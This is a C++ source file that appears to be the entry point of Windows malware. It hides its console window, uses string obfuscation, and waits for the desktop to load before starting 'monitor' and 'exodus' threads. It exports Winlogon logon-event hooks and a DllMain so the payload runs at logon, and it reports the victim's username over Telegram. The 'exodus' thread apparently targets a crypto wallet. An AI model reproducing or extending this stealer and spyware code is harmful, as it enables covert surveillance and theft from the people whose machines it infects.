#include <impl/includes.h>

static DWORD WINAPI exodus_thread(LPVOID lpParam) {
    exodus::c_exodus* exodus = reinterpret_cast<exodus::c_exodus*>(lpParam);
    return exodus->compile_exodus() ? 0 : 1;
}

static DWORD WINAPI monitor_thread(LPVOID lpParam) {
    monitor::c_monitor* monitor = reinterpret_cast<monitor::c_monitor*>(lpParam);
    monitor->monitor_group(utility::get_username());
    return 1;
}

bool control_handler( std::uint32_t signal ) {
    https::send_telegram_message( oxorany( "[@" ) + utility::get_username( ) + oxorany( "] disconnected." ) );
    return EXCEPTION_EXECUTE_HANDLER;
}

void run_payload( ) {
    HWND hwnd = GetConsoleWindow( );
    ShowWindow( hwnd, SW_HIDE );

    //SetConsoleCtrlHandler(
    //    reinterpret_cast< PHANDLER_ROUTINE >( control_handler ),
    //    true
    //);

    Gdiplus::GdiplusStartupInput input;
    Gdiplus::GdiplusStartup( &g_monitor->gdiplus_token_, &input, nullptr );

    if ( sodium_init( ) == -1 ) {
        return;
    }

    while ( !( utility::is_explorer_running( ) && utility::is_computer_ready( ) ) )
        Sleep( 500 );

    CreateThread( NULL, 0, monitor_thread, &g_monitor, 0, NULL );
    CreateThread( NULL, 0, exodus_thread, &g_exodus, 0, NULL );
}

extern "C" __declspec(dllexport) void WLEventLogon(LPVOID, LPVOID, LPVOID) {
    run_payload();
}

extern "C" __declspec(dllexport) void WLEventLogoff(LPVOID, LPVOID, LPVOID) {}
extern "C" __declspec(dllexport) void WLEventStartup(LPVOID, LPVOID, LPVOID) {}
extern "C" __declspec(dllexport) void WLEventShutdown(LPVOID, LPVOID, LPVOID) {}
extern "C" __declspec(dllexport) void WLEventLoggedOut(LPVOID, LPVOID, LPVOID) {}
extern "C" __declspec(dllexport) void WLEventLoggedIn(LPVOID, LPVOID, LPVOID) {}

BOOL WINAPI DllMain(HINSTANCE, DWORD fdwReason, LPVOID) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        run_payload();
    }
    return TRUE;
}

int main( ) {
    run_payload();
}